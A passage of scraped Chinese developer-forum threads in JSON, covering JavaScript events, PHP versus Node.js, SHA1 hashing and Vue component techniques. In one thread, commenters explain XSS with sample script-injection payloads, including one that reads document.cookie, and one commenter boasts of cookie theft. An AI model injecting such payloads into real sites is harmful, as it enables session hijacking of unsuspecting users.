[
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><img alt=\"screenshot\" src=\"http://i.imgur.com/kbHRJEj.png\"></p>\n<p>stopPropagation()并不能阻止，因为它是 capture 而不是 bubble ， capture 的顺序是先父后子、自上而下的。</p>\n</div></div>", "<div class=\"topic_content\">除了 remove 掉这个 listener</div>", "<div class=\"topic_content\">Sorry\r<br>标题描述有误，应该式阻止 close 事件，而不是 click 事件</div>"], "reply": "14", "tittle": "如何阻止这个 click 事件发生？", "comment": ["return false;\r", "但是不建议总是把事件设置在捕获阶段触发，然后还不能移除监听器，思路再理清一下，看能不能有别的做法。", "做个 opacity 0.01 的东西罩在页面上面 XD", "不是很明白要什么样的效果，是希望点击后能 emit 个 open 事件，但这个 click 不在其子元素上触发吗？\r", "\r", "至于 1L 说的 return false ，其实在 jQuery 里面才是等于 event.preventDefault() & event.stopPropagation()，但在原生的并没有什么作用。不过正常情况下真的极少会更改事件的捕获方式。\r", "\r", "Anyway, CSS 有个 pointer-events: none;属性，可以阻止元素响应 click 事件，或许会有用。", " 不好意思，标题描述有误，应该是阻止 close 事件，而不是 click 事件", " 不好意思，标题描述有误，应该是阻止 close 事件，而不是 click 事件", " 很好的问题，我找了找没找到方案。\r", "网上说是 js 无法阻止页面关闭。\r", "this.close;\r", "function() { [native code] }\r", "\r", "var close='a';\r", "undefined\r", "\r", "this.close();\r", "VM30633:2 Uncaught TypeError: this.close is not a function(…)(anonymous function) @ VM30633:2InjectedScript._evaluateOn @ (program):878InjectedScript._evaluateAndWrap @ (program):811InjectedScript.evaluate @ (program):667\r", "\r", "this.close;\r", "\"a\"", " 不是阻止页面关闭，是想阻止 close 函数执行", "在 close 函数内做判断", " close 函数不是我写的，在一个第三方库里面。最好不用改库，看来唯一的方法就是移除监听器了？", " 外面再包一层", " document 的外面？ document 不是最外了吗？", " ((((；ﾟДﾟ))))))) 你自己包一层作为 click 事件的函数", " 你把 close 改了不就好了。。", " 因为 close 是在第三方库里，所以最好不用改。但现在貌似没有好的方案了，只能移除监听器或者改库。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>百度编辑器在使用多图上传的时候选中图片点击确认就会列在编辑器中，在线管理里面也有。</p>\n<p>问题：我想在点击确定是只让图片放在在线管理中，不让图片在编辑器内容中出现，应该怎么修改</p>\n</div></div>"], "reply": "1", "tittle": "百度编辑器多图上传", "comment": ["修改相关的 js ，就是上传成功有会有回调，把图片地址 append 到编辑内容里面，你吧那一句改成“ debug ”，你就知道是不是那里了，确认后，你删掉那一句就行。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>看到 V 友 ， 用 vue 搞了个八音盒小游戏 ， 然后就兴起了 ﾍ(ﾟ∀ﾟﾍ) ，用原生搞了一个。\n难耐公司最近要上运营活动，产品各种逻辑走不通，所以总是没时间做自己想做的事，一直在搞令人作呕的产品逻辑。</p>\n<p>今天终于有时间把这个写了，最后发现仍上线，要 https 才能调起麦克风，所以代码只能本地跑</p>\n<p>以前都是用setInterval 或 setTimeout 来做这种动画， 这次用requestAnimationFrame ，感觉性能好了很多。</p>\n<p>( <a href=\"https://github.com/jlianphoto/theEight\" rel=\"nofollow\">https://github.com/jlianphoto/theEight</a>)</p>\n<p><img alt=\"demo\" src=\"https://github.com/jlianphoto/theEight/raw/master/img/theEight.png\"></p>\n</div></div>"], "reply": "2", "tittle": "用原生 撸了一个 八音盒小游戏", "comment": ["ReferenceError: AudioAPI is not defined", " ，没注意好大小写，改好了。最好用 chrome , 然后你的电脑一定要有麦克风，没有麦克风，拿不到 source"]},
{"content": ["<div class=\"topic_content\">兄弟门，我刚才发现我无意中竟然尝试在攻击别人的网站。\r<br>\r<br>刚才我特别想把一个网站的 textarea 的 value ，不用手动输入， 而是传一个字符串。\r<br>\r<br>document.getElementById(\"\").value = \"AAA\"\r<br>\r<br>我搞了半天想直接让对方网站执行这一行代码，这在浏览器这边，用 F12 里的 console 是可以设置那个 textarea 的 value 。\r<br>但如果直接通过程序执行这个代码，那不就是让别人网站执行你的 JS 代码吗？那不就能获取到包括 cookie 在内的一些敏感信息了么？\r<br>搞了半天才意识到这是有问题的\r<br>幸好没成功。\r<br>\r<br>这是叫做 XSS 注入攻击吧？有搞网络安全的高人指点一下么？\r<br>\r<br>\r<br>好吧，如果不这样做，怎么才能改变这个 textarea 的 value 呢？</div>", "<div class=\"topic_content\">@<a target=\"_blank\" href=\"/member/kulove\">kulove</a> 我其实就是想说，我希望能够把一个网页提供的服务，做成 API ，这个网页有一个 input textarea ，需要手动输入，然后点击按钮 submit 。\r<br>\r<br>我就特别希望把需要手动输入的 input textarea ，不要手动了，而是使用 post 等方法，传一个值进去，再点击这个 button 。\r<br>\r<br>搞了半天没成功。我意识到这样搞可能是在攻击别人。\r<br>\r<br>至于 console 里写那一行代码，是调试。看这行代码能不能行确定改变这个 textarea 的 value 。</div>"], "reply": "57", "tittle": "我竟然无意中在尝试攻击别人家的网站，真尼玛醉了", "comment": ["小学生放学了? 先补补语文再去学习 JS 吧, 毕竟语文数学英语都是必修基础课.....", "上帝将智慧洒满人间 你却撑起了伞╮(╯▽╰)╭", " 我不懂就来问，你这样何苦呢。你出生就是 CS 本科毕业？", "是 XSS ，但是一般都是 进行过滤的。 获取 cookie 算小的，如果能执行 sql 直接 drop 掉数据库。", "/><script>alert('楼主领盒饭');</script><", "楼主 要在电脑旁边插上三支香 才可以这个值", " 借点你的智慧呗。我的不够用。", " 何苦呢？你难道不是这样过来的？", "Greasemonkey", "删掉空格", "支持楼主探索，\r", "说风凉话的有意思吗？", "楼主，别人的网站从未自己执行过网页上的 JS ，都是你的浏览器在执行。包括你自己在 console 写上去的代码。", "五十笑百", "如果对方网站没过滤确实是能这样的 不过楼主你在 console 里面。。。 怎么改都是在单机啊", " 我靠你说的对啊。我把自己绕进去了。", "这个一般都是搞搜索页。\r", "\r", "因为搜索页会生成有一个带参数的链接，可以转发给其他人。", "/><script>alert('楼主领盒饭');</script><", " 我想通过写几行代码，让对方服务器执行这行代码。结果发现不成功。在自己 console 里试了试，可以。现在才发现我把自己绕进去了。", "我以为我穿越了 上回看到这种问题是在七八年前的建站论坛里。。。", " 谢谢解答和支持", " 那有什么， JavaScript 学的水的人多了去了，你现在就遇到了一个:)", "标题上加个 「震惊！」 更有说服力些。", "记得很久以前的时候，我学着用 FontPage 做网页。做好了之后用 IE 打开了网站首页开始欣赏了起来。由于之前没上过网，那个网站就成为了唯一一个我能浏览的网站了。\r", "\r", "一个意外的右击让我发现了“查看页面源代码”这个菜单项，点击之后弹出了一个记事本，里面是一些代码，中间夹杂着我网页中的文字。\r", "\r", "由于好奇，我更改了其中一些文字，然后保存了那个文件，关掉了记事本，刷新了一下我的网页，神奇的一刻出现了：我更改的内容竟然出现在了网页上！！\r", "\r", "“看来 IE 的安全性很差真的是名副其实啊，竟然能让浏览者随意更改网页的内容”，我当时心想。", " 那我应该去 UC 应聘了", " 震惊！用 F12 竟能修改 google 首页！😂", "有些基本概念可能需要厘清一下。\r", "\r", "1. 浏览器的 console 的 document 改的是什么？ \r", "2. 浏览器和对方服务器是怎么交互的？\r", "3. XSS 攻击的几个条件。\r", "\r", "\r", "我也是二把刀，只能讲下自己的理解。\r", "1. console 这里改动的都是你客户端本地机器渲染出来的内容。你可以用脚本去 setValue ，但是这都是你本地浏览器里的内容，和对方服务器无关。\r", "2. 浏览器和服务器交互一般来说是页面的 http get/post 这个样子，再多一层就是 ajax 的 http get/post 。虽然有 socket 之类的应该不是你想问的内容。在你的例子里，你的改动不经过 http 请求是发不到服务器端的，所以也不存在攻击了别人网站这回事情。\r", "3. XSS 攻击要求 a.把你的脚本上传到服务器上， b. 别人读取服务器内容是顺便读取了你上传的脚本， c.别人的浏览器执行了你的脚本。 这样造成的结果就是别人不知情的情况下用他的浏览器运行了你的脚本，是为跨站+脚本+攻击。同样，在你的例子里，你的 Scripts 没有传到服务器上别人是读不到你的 Scripts 的，同时你的脚本没有攻击性，所以既不是跨站，也不是脚本攻击，和 XSS 没有关系。。。\r", "\r", "\r", "我觉得大家吐槽大概是觉得这些东西解释起来太麻烦了吧。。。应该不是恶意的。。。\r", "\r", "我为啥这么闲的蛋疼解释呢？因为我年假快过期了今天在家里蹲着休假呀！", "#1 说话确实不好听，但是道理没有错，发帖子确实应该有些技巧，这个和初学者无关。\r", "\r", "你那么多话其实就用一句就能概括：\r", "\r", " [console 执行 document.getElementById(\"\").value = \"AAA\" 是否算 XSS 注入] ", "小学计算机课上我曾经兴冲冲地跟旁边的同学说这个“发现”\r", "当时不记得是 IE4 还是什么，没有什么 F12 ，就是一个查看源代码还是叫什么的按钮\r", "然后我把代码用记事本打开，另存为……\r", "同学都善意地指出我只是保存到自己电脑了， 233", " 谢谢。", "请多点宽容。至少我觉得楼主还没到要我们冷嘲热讽或者恶言的地步。", "写的太乱，表述不清楚。", "这种表述能力你可以告别这一行了。。。", "XSS 。我用这方法偷 cookie ，进入了很多钓鱼网站的后台", " 那但愿你在这一行干的久一点，写代码到 70 岁吧。", " 我其实就是想说，我希望能够把一个网页提供的服务，做成 API ，这个网页有一个 input textarea ，需要手动输入，然后点击按钮 submit 。我就特别希望把需要手动输入的 input textarea ，不要手动了，而是使用 post 等方法，传一个值进去，再点击这个 button 。搞了半天没成功。我意识到这样搞可能是在攻击别人。至于 console 里写那一行代码，是调试。看这行代码能不能行确定改变这个 textarea 的 value 。", "1L 说的并不是技术问题，而是语文能力。\r", "说话之前要先想一下，把语言组织好，方便别人理解，这也是对别人的尊重。", " #35 做成 API post 的话不属于攻击的。\r", "\r", "至于攻击要看你输入的值是什么了，输入 html 标签可能是 xss ，输入 sql 就是 sql 注入了。", " 谢谢指点！", " 大神好厉害！", "xss （跨站脚本执行）是服务端漏洞（ dom xss 略微有些不同），你也可以理解成 js 注入，你的输入导致服务端返回的 js 注入了你的 js 代码 所以先谷歌一下还是比较好的", "F12 的不算 XSS 的。\r", "26 楼说的更多的是存储型的 XSS ，多见于留言板等功能处，将形如 \r", "</textarea><script>alert(document.cookie)</script><textarea>\r", "的 payload 写入服务器的数据库，如果成功的话，任意人查看该页面时都会弹框。\r", "还有反射型的 XSS ，是服务器将 get 的参数未经过滤直接嵌入了页面代码，因此可以构造形如\r", ";\r", "的 payload ，将 URL 发送给受害者，受害者点击后其浏览器会弹窗。", "为什么感觉这个帖子萌萌哒", "弱弱说句..我们现在的项目里就没有防 xss..隔三差五有点小 bug(非恶意)..  幸亏不是 toB 的工程..", "CS 本科毕业并不知道什么是 XSS 什么是\r", "我们网络安全是选修然而我并没选，但是数学语文英语是必修", " #25 66666666666", "  我特么也是这么走上不归路的。。。至今已经十二三年了。。", "今天 v2 怎么这么多人开嘲讽的\r", "说的好像自己没彩笔过似的", "建议理解区分一下客户端，服务端", "看了楼主以往的帖子，楼主真心很幽默", "lz 真的好萌唉。", "1# 虽然话不好听，但人家并没吐槽什么 CS 知识，人家吐槽的是 “语言表达”。\r", "连最基本的语句通顺都做不到，你要别人怎么拿出认真的态度回应你。", "self-xss, sb", "1# 说话虽然带着嘲讽，但是点出了楼主真正的问题所在\r", "楼主应该从里面知道自己的不足，而不是埋怨别人为什么要嘲讽自己。\r", "\r", "真正讨厌的是那种无脑喷、目中无人、带家人骂人的那群人。", "想到个笑话，小时候上网，有个朋友和我说‘你看网页的时候不要老用鼠标框那些文字，这样影响别人（网上同样浏览这个网页的人）看的’", "我才发现那个“红轴 THINKPAD ”也是出自 LZ 之手。如果 LZ 不是故意卖萌，那就真的是天然激萌啊哈哈", " 那个楼主...我错了, 向你道歉.\r", "\r", "顺便给你介绍个 Chrome 插件, 应该可以完美满足你的需求.\r", "插件名字: Autofill\r", "\r", " 也向你道歉.", "楼主，建议你先去学点网络基础，不会浪费时间的。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>var fid = $.sha1(String(((+!![]+[])-(![]+![])))+(((+!![]+[])+(![]+![]))-(+!![]+[]+[])));\njs 中的式子，如何使用 php 函数计算出 fid 的值呢？</p>\n</div></div>"], "reply": "22", "tittle": "求助：有 PHP 函数可以计算出 js 的值吗？", "comment": [" 这个怎么样", "目测反爬虫机制，格式不变的话自己写解析器。或者直接用 Node.js ， eval 一下就好。", "v8js 并没有啥用，因为里面没有 dom ， js 和 dom 绑定很厉害的", " 你在说什么。。？😂", " +1\r", " 你在说什么。。？😂", " ", " 你在说什么？😂", "这 js 代码。。。", "为啥你们都取笑 @", "  我觉得说的很有可能有道理，$开头的一般就是 jquery ，单独在 node 下可能还真跑不了，虽然有 jsdom 这样的黑科技，但是真用起来还不知道得踩多少坑", "推荐 phantomjs 还是王道", "php -r 'echo sha1(exec(\"node -e '\\''console.log(String(((+!![]+[])-(![]+![])))+(((+!![]+[])+(![]+![]))-(+!![]+[]+[])))'\\''\"));'", " 嗯 你说的对", "  这个没研究过，回头看看", " 嗯 感谢。", " $.sha1() 換成其他 sha1 的 js 庫就行了，如果願意甚至可以直接用 php 的 sha1()", " 这个使用 php sha1 （）库应该怎么搞呢？ 求大佬指点下。", " php 自带 sha1() 函数", " 使用 php sha1() 计算出来的结果是不正确的。\r", "\r", "js 的 sha1 函数 计算的结果是正确的， sha1 函数 如下，能否改写成 php 的 sha1 函数吗？\r", "\r", "function sha1 (str) {\r", "   var hash\r", "  try {\r", "    var crypto = require('crypto')\r", "    var sha1sum = crypto.createHash('sha1')\r", "    sha1sum.update(str)\r", "    hash = sha1sum.digest('hex')\r", "  } catch (e) {\r", "    hash = undefined\r", "  }\r", "\r", "  if (hash !== undefined) {\r", "    return hash\r", "  }\r", "\r", "  var _rotLeft = function (n, s) {\r", "    var t4 = (n << s) | (n >>> (32 - s))\r", "    return t4\r", "  }\r", "\r", "  var _cvtHex = function (val) {\r", "    var str = ''\r", "    var i\r", "    var v\r", "\r", "    for (i = 7; i >= 0; i--) {\r", "      v = (val >>> (i * 4)) & 0x0f\r", "      str += v.toString(16)\r", "    }\r", "    return str\r", "  }\r", "\r", "  var blockstart\r", "  var i, j\r", "  var W = new Array(80)\r", "  var H0 = 0x67452301\r", "  var H1 = 0xEFCDAB89\r", "  var H2 = 0x98BADCFE\r", "  var H3 = 0x10325476\r", "  var H4 = 0xC3D2E1F0\r", "  var A, B, C, D, E\r", "  var temp\r", "\r", "  // utf8_encode\r", "  str = unescape(encodeURIComponent(str))\r", "  var strLen = str.length\r", "\r", "  var wordArray = []\r", "  for (i = 0; i < strLen - 3; i += 4) {\r", "    j = str.charCodeAt(i) << 24 |\r", "      str.charCodeAt(i + 1) << 16 |\r", "      str.charCodeAt(i + 2) << 8 |\r", "      str.charCodeAt(i + 3)\r", "    wordArray.push(j)\r", "  }\r", "\r", "  switch (strLen % 4) {\r", "    case 0:\r", "      i = 0x080000000\r", "      break\r", "    case 1:\r", "      i = str.charCodeAt(strLen - 1) << 24 | 0x0800000\r", "      break\r", "    case 2:\r", "      i = str.charCodeAt(strLen - 2) << 24 | str.charCodeAt(strLen - 1) << 16 | 0x08000\r", "      break\r", "    case 3:\r", "      i = str.charCodeAt(strLen - 3) << 24 |\r", "        str.charCodeAt(strLen - 2) << 16 |\r", "        str.charCodeAt(strLen - 1) <<\r", "      8 | 0x80\r", "      break\r", "  }\r", "\r", "  wordArray.push(i)\r", "\r", "  while ((wordArray.length % 16) !== 14) {\r", "    wordArray.push(0)\r", "  }\r", "\r", "  wordArray.push(strLen >>> 29)\r", "  wordArray.push((strLen << 3) & 0x0ffffffff)\r", "\r", "  for (blockstart = 0; blockstart < wordArray.length; blockstart += 16) {\r", "    for (i = 0; i < 16; i++) {\r", "      W[i] = wordArray[blockstart + i]\r", "    }\r", "    for (i = 16; i <= 79; i++) {\r", "      W[i] = _rotLeft(W[i - 3] ^ W[i - 8] ^ W[i - 14] ^ W[i - 16], 1)\r", "    }\r", "\r", "    A = H0\r", "    B = H1\r", "    C = H2\r", "    D = H3\r", "    E = H4\r", "\r", "    for (i = 0; i <= 19; i++) {\r", "      temp = (_rotLeft(A, 5) + ((B & C) | (~B & D)) + E + W[i] + 0x5A827999) & 0x0ffffffff\r", "      E = D\r", "      D = C\r", "      C = _rotLeft(B, 30)\r", "      B = A\r", "      A = temp\r", "    }\r", "\r", "    for (i = 20; i <= 39; i++) {\r", "      temp = (_rotLeft(A, 5) + (B ^ C ^ D) + E + W[i] + 0x6ED9EBA1) & 0x0ffffffff\r", "      E = D\r", "      D = C\r", "      C = _rotLeft(B, 30)\r", "      B = A\r", "      A = temp\r", "    }\r", "\r", "    for (i = 40; i <= 59; i++) {\r", "      temp = (_rotLeft(A, 5) + ((B & C) | (B & D) | (C & D)) + E + W[i] + 0x8F1BBCDC) & 0x0ffffffff\r", "      E = D\r", "      D = C\r", "      C = _rotLeft(B, 30)\r", "      B = A\r", "      A = temp\r", "    }\r", "\r", "    for (i = 60; i <= 79; i++) {\r", "      temp = (_rotLeft(A, 5) + (B ^ C ^ D) + E + W[i] + 0xCA62C1D6) & 0x0ffffffff\r", "      E = D\r", "      D = C\r", "      C = _rotLeft(B, 30)\r", "      B = A\r", "      A = temp\r", "    }\r", "\r", "    H0 = (H0 + A) & 0x0ffffffff\r", "    H1 = (H1 + B) & 0x0ffffffff\r", "    H2 = (H2 + C) & 0x0ffffffff\r", "    H3 = (H3 + D) & 0x0ffffffff\r", "    H4 = (H4 + E) & 0x0ffffffff\r", "  }\r", "\r", "  temp = _cvtHex(H0) + _cvtHex(H1) + _cvtHex(H2) + _cvtHex(H3) + _cvtHex(H4)\r", "  return temp.toLowerCase()\r", "}", " 简单地测试了一下：\r", "取字符串「 333917 」（本帖的 id ）\r", "用 php 计算 sha1 结果为 af4ae87b322f76c430b579fcf8ca54aa886de62a\r", "用你提供的 js 函数（在 Chrome Console ）计算 sha1 结果为 af4ae87b322f76c430b579fcf8ca54aa886de62a\r", "看不出哪里有错误……", " 是的，这两个函数是相等的。\r", "但是本贴的字符串“ String(((+!![]+[])-(![]+![])))+(((+!![]+[])+(![]+![]))-(+!![]+[]+[]))”  使用 php ，计算的结果，与 js 提供的函数计算的 sha1 值却不同。\r", "是不是得把 字符串 转换一下，这个地方有点疑问。求指点。", "你先别计算 sha1 ，先看看传递给 sha1() 函数的字符串是否相等。", " #21 忘记 @"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>github: <a href=\"https://github.com/chjtx/JTaro-Module\" rel=\"nofollow\">https://github.com/chjtx/JTaro-Module</a></p>\n<ul>\n<li>如果你想使用 ES6 模块语法管理代码，又不想使用 webpack 、 babel 等各种转译</li>\n<li>如果你只是想简简单单的写个 js 、 html 、 css ，不需要 typescript 、 postcss 等高级工具</li>\n<li>如果你想开发时所见到的错误就像使用 script 标签引入的脚本一样清晰</li>\n<li>如果你想上线代码只打包成一个或几个文件以减少文件体积和连接数</li>\n</ul>\n<p>那么可以去看看这款 2017 年模块管理新体验的前端工具</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "一款不需要 babel 转译的 ES6 模块管理工具", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>目前技术栈是 ES6+webpack+vue+vuex+vue-router ，因为要使用 webpack ，简单学了下 node 的基础和以及 npm 。现在自己做网站，需要学一门后端语言，不知道适合学啥。说一下自身情况，前端是自学的，本科和研究生专业都偏向自动控制方向。没有学过后端语言，也不熟悉数据库和服务器那些东西，想把这些相关的知识都学一下。</p>\n</div></div>", "<div class=\"topic_content\">已经决定 php 了，毕竟天下第一←_←</div>", "<div class=\"topic_content\">已经把 w3c 上的 php 教程过了一遍了，很多地方和 js 挺接近，正在写 sql 。元旦准备写几个 demo 练练手。等把后端体系熟悉了，就以 nodejs 为主了。</div>"], "reply": "68", "tittle": "前端程序员学后端开发，选择 Node.js 还是 php", "comment": ["Node 。成本低。", "用过 js 就 node, 没用过就没所谓. 语言没那么重要. 熟练 php 的人给一个礼拜肯定能跑 node 了, 反过来也一样. 当然精通另算.", "php 居然能进你的选项里？", "如果真要做全栈还是 PHP ，入门简单，深入也可以， web 之王，如果只是想学点来辅助前端那肯定是 node ，可以加强对 js 的训练和拓展后端思维，最最需要打消的念头就是 js 统一前后端， js 全栈， js 碉堡一统这种想法，语言在一个技术栈里占比最低了，你可以把 php 或者 python 的文档看看，要不了多久时间，难得是一个技术栈体系， node 比 php 更偏低层，要想做好比 php 成本更高", " php 咋啦。。", "   那就 php 了，感谢", "php 是世界上最好的语言，这句话一半是玩笑，一半是真的，因为 java 属于信仰的范畴，然后看 php ，这语言多少年了就不说了，随便拉一个框架出来比 node 都老，调优、配置什么也都是教科书一样写好了，你说 php 性能不行也没人逼你用 php5 啊， php7 都出来 1 年多了吧\r", "很多人就看 node 什么处理啥啥啥性能好，怎么大并发，也不看人家花了多少钱把静态资源全甩到全国的 cdn 上了，你有这个财力和魄力么", "如果用 php ，可以用 thinkphp5 不错，上手简单快速。\r", "用 lavarel 需要投入很多精力去学习。", "laravel + 1", "Python,人生苦短", "主要是后端的相应的知识体系, 至于语言嘛, c-like 的成本都不高,", "前端果断 node 啊", "Python, 人生苦短", "建议 PHP ，都是 JS ，减少学习时间！！！", "出来吧， typescript ， ", "rust 绝对不后悔", "ruby 大法好", "前端的我反而不推荐 node ，学一门新的语言拓展自己的视界才是最实在，我推荐 python", "已经在学习 PHP 了，等熟悉了后端的知识体系，转向 Node.js ，还是用一种语言开发比较舒服。", "建议你还是 node.js", " +1", "ES6+webpack+vue+vuex+vue-router 这个技术栈，真心推荐 PHP ，并且是推荐 Laravel 。", "python, 或者微軟大法好 asp.net,,,,.", " 如何深入 php ，学习路线怎样", "php 程序员很多， nodejs 程序员少", "node ，语法差不多，学的快", "不要用 laravel", "取决于你想在后端的深度", "php\r", "node 的成本太高了", "想问问楼主究竟如何深入前端学习啊，我现在在学你说的那些技术栈，但是很多还是不懂，我现在连 vue.js 官方文档的进阶部分都看不懂。。。怎么破", "php 啊，最好的语言，不是吹的", "Ruby", "node", "真的发现没时间学 PHP 。。 Node 倒是平时能接触不少，但是基本上也只能入门。感觉要深入，还是要从 PHP 学起，还有网络编程那块，真的不是一两个月就能学好的。", "楼上都弱爆了，我推荐 julia 逃）", "为什么不都去学一下呢？\r", "都不是太难的", "php 确实很有发展前景就是了", "nodejs", "触类旁通,node.js/php/.net 互切也就几天的事情", "反正都增删改查", "nodejs 没流行起来之前我接触的 php ，然后 nodejs ，再是 python..", "java ,然后是 python 或者 ruby", "学 python 吧", "我为 php+1s", " +10086", "最近我也有这个需求，一个新项目要上 node,但是又怕出了问题没人问，楼主的组里有后端人员吗？", " 是日本的 julia 嘛", "我觉得 Node 比较好，前端构建也用得着。", " 好几个后端，我只是自己学一下", "宇宙第一语言 php", " 我这边都是前端，所以不敢完全上 node,因为数据库，包括 node 运维那块都完全没人，还在纠结中", "学 php 好,为 php 续一秒 !\r", "\r", "另外求一本 php 转 java 的入门书.", "还真学 php 了？", "干嘛想不开学 php 啊", "和楼主有一样的想法 准备明年学个后端语言 拓展下知识面\r", "\r", "目前备选的： Java 、 Ruby 、 Python （没考虑过 Nodejs 与 PHP...）", "Python", "既然都会前端了。 \r", "假设这样的场景， 比如前端生成二维码，业务需要后端生成了，你再找个 PHP 的包？ \r", "假设你前后端都写， js 的异步和 PHP 的同步对你的思维转换的训练倒是挺好", "说的都还是前端啊", "看头像，选语言 ^-^", " 原因是啥", "推荐 ruby 。同前端，后端打算学 ruby+node", "php 是世界上最好的语言", "go ，以后如果你不想做 web ，想转服务端了会容易一点点", "居然选了 PHP, 现成的 nodejs 不学....", "先从 php 入手后端开发吧， php 已经在 web 后端开发占据了很多年的主导地位，了解 php 后端开发之后也可以转别的语言", "可以合作啊. 我写后端, 你写前端 ; )", "自從我會了 PHP 。\r", "像 JavaScript / react / VUE\r", "像 CSS/HTML\r", "像 Python\r", "\r", "都不知道什麼時候都學會了。\r", "語言這些，學會一個，別的都一樣。\r", "\r", "但是，關鍵的來了。\r", "我只是一名 UI 設計師⋯\r", "為什麼我學會了那麼多啊？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><blockquote>\n<p>最近数月一直投身于 <a href=\"https://github.com/iview/iview\" rel=\"nofollow\">iView</a> 的开源工作中，完成了大大小小 30 多个 UI 组件，在 Vue 组件化开发中积累了不少经验。其中也有很多带有技巧性和黑科技的组件，这些特性有的是 Vue 文档中提到但却容易被忽略的，有的更是没有写在文档里，今天就说说 Vue 组件的高级玩法。</p>\n</blockquote>\n<h3>写在前面</h3>\n<p>本文所讲内容大多在 <a href=\"https://github.com/iview/iview\" rel=\"nofollow\">iView</a> 项目中使用，大家可以前往关注，并结合源代码来研究其中的奥妙。项目地址：\n<strong><a href=\"https://github.com/iview/iview\" rel=\"nofollow\">https://github.com/iview/iview</a></strong></p>\n<h3>目录</h3>\n<ul>\n<li>递归组件</li>\n<li>自定义组件使用 <code>v-model</code></li>\n<li>使用<code>$compile()</code>在指定上下文中手动编译组件</li>\n<li>内联模板<code>inline-template</code></li>\n<li>隐式创建 Vue 实例</li>\n</ul>\n<h3>递归组件</h3>\n<p>递归组件在文档中有介绍，只要给组件指定一个 <code>name</code>字段，就可以在该组件递归地调用自己，例如：</p>\n<pre><code>var iview = Vue.extend({\n  name: 'iview',\n  template:\n    '&lt;div&gt;' +\n      // 递归地调用它自己\n      '&lt;iview&gt;&lt;/iview&gt;' +\n    '&lt;/div&gt;'\n})\n</code></pre>\n<p>这种用法在业务中并不常见，在 iView 的级联选择组件中使用了该特性\n（<a href=\"https://github.com/iview/iview/tree/master/src/components/cascader\" rel=\"nofollow\">https://github.com/iview/iview/tree/master/src/components/cascader</a>）\n效果如下图所示：\n<img alt=\"\" src=\"https://dn-mhke0kuv.qbox.me/06f82a65a1bd5d19fd12.png\">\n图中每一列是一个组件（<code>caspanel.vue</code>）,一开始想到用 <code>v-for</code>来渲染列表，但后面发现扩展性极低，而且随着功能的丰富，实现起来很困难，处理的逻辑很多，于是改写成了递归组件：</p>\n<pre><code>&lt;ul v-if=\"data &amp;&amp; data.length\" :class=\"[prefixCls + '-menu']\"&gt;\n    &lt;Casitem\n        v-for=\"item in data\"\n        :prefix-cls=\"prefixCls\"\n        :data.sync=\"item\"\n        :tmp-item=\"tmpItem\"\n        @click.stop=\"handleClickItem(item)\"\n        @mouseenter.stop=\"handleHoverItem(item)\"&gt;&lt;/Casitem&gt;\n&lt;/ul&gt;&lt;Caspanel v-if=\"sublist &amp;&amp; sublist.length\" :prefix-cls=\"prefixCls\" :data.sync=\"sublist\" :disabled=\"disabled\" :trigger=\"trigger\" :change-on-select=\"changeOnSelect\"&gt;&lt;/Caspanel&gt;\n</code></pre>\n<p>props 比较多，可以忽略，但其中关键的两个是<code>data</code>和 <code>sublist</code>，即当前列数据和子集的数据，因为预先不知道有多少下级，所以只需传递下级数据给组件本身，如果为空时，递归就结束了， Vue 这样设计的确很精妙。\n注：该方法在 Vue 1.x 和 2.x 中都支持。</p>\n<h3>自定义组件使用 <code>v-model</code></h3>\n<p>我们知道，<code>v-model</code>是在表单类元素上进行双向绑定时使用的，比如：</p>\n<pre><code>&lt;template&gt;\n    &lt;input type=\"text\" v-model=\"data\"&gt;\n    {{ data }}\n&lt;/template&gt;\n&lt;script&gt;\n    export default {\n        data () {\n            return {\n                data: ''\n            }\n        }\n    }\n&lt;/script&gt;\n</code></pre>\n<p>这时<code>data</code>就是双向绑定的，输入的内容会实时显示在页面上。在 Vue 1.x 中，自定义组件可以使用 props 的<code>.sync</code>双向绑定，比如：</p>\n<pre><code>&lt;my-component :data.sync=\"data\"&gt;&lt;/my-component&gt;\n</code></pre>\n<p>在 Vue 2.x 中，可以直接在自定义组件上使用 <code>v-model</code>了，比如：</p>\n<pre><code>&lt;my-component v-model=\"data\"&gt;&lt;/my-component&gt;\n</code></pre>\n<p>在组件<code>my-component</code>中，通过<code>this.$emit('input')</code>就可以改变 data 的值了。\n虽然 Vue 1.x 中无法这样使用，但是如果你的组件的模板外层是 <code>input</code>、<code>select</code>、<code>textarea</code>等支持绑定 v-model 特性的元素，也是可以使用的，比如 my-component 的代码是：</p>\n<pre><code>&lt;template&gt;\n    &lt;input type=\"text\"&gt;\n&lt;/template&gt;\n</code></pre>\n<p>那也可以使用上面 2.x 的写法。</p>\n<h3>使用<code>$compile()</code>在指定上下文中手动编译组件</h3>\n<p>注：该方法是在 Vue 1.x 中的使用介绍，官方文档并没有给出该方法的任何说明，不可过多依赖此方法。\n使用<code>$compile()</code>方法，可以在任何一个指定的上下文（ Vue 实例）上手动编译组件，该方法在 iView 新发布的表格组件 Table 中有使用：\n<a href=\"https://github.com/iview/iview/tree/master/src/components/table/cell.vue\" rel=\"nofollow\">https://github.com/iview/iview/tree/master/src/components/table/cell.vue</a>\n由于表格的列配置是通过一个 Object 传入 props 的，因此不能像 slot 那样自动编译带有 Vue 代码的部分，因为传入的都是字符串，比如：</p>\n<pre><code>{\n    render (row) {\n        return `&lt;i-button&gt;${row.name}&lt;/i-button&gt;`\n    }\n}\n</code></pre>\n<p>render 函数最终返回一个字符串，里面含有一个自定义组件 i-button ，如果直接用<code>{{{ }}}</code>显示， i-button 是不会被编译的，那为了实现在单元格内支持渲染自定义组件，就用到了<code>$compile()</code>方法。\n比如我们在组件的父级编译：</p>\n<pre><code>// 代码片段\nconst template = this.render(this.row);    // 通过上面的 render 函数得到字符串\nconst div = document.createElement('div');\ndiv.innerHTML = template;\nthis.$parent.$compile(div);    // 在父级上下文编译组件\nthis.$el.appendChild(cell);    // 将编译后的 html 插入当前组件\n</code></pre>\n<p>这样一来， 